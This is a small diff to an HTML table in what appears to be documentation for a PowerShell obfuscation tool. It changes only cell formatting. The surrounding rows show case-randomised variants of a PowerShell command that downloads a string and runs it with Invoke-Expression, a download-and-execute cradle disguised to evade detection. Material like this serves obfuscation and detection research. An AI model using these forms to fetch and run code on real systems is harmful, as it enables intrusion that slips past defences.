@@ -360,7 +360,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
   <td align="center">20</td>
   <td align="center">LAUNCHER\PS\*</td>
-  <td>
+  <td nowrap>
    <strong>LAUNCHER\PS\0       NO EXECUTION FLAGS</strong>
    <p>poWeRsHEll   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
    <p>POwErShell   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
